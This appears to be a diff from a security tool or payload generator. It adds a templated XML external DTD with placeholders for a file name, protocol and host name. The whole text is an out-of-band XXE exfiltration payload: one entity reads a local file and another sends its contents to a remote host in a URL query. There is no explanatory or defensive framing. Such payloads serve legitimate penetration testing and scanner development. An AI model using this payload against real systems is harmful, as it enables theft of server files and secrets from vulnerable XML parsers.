@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file://{{fileName}}">
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM '{{protocol}}://{{hostName}}/data?%file;'>">
+%all;
+%send;
